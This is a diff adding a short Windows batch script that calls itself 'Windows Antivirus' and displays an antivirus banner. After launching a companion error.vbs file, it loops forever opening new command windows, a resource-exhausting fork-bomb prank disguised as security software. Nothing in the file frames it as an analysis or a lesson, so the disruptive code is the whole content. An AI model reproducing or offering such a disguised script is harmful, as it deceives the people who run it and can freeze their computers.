@@ -1,0 +1,9 @@
+echo off
+title Windows Antivirus
+start error.vbs
+cls
+echo Windows ANTIVIRUS for Windows Computers Only
+pause
+:a
+start CMD
+goto a
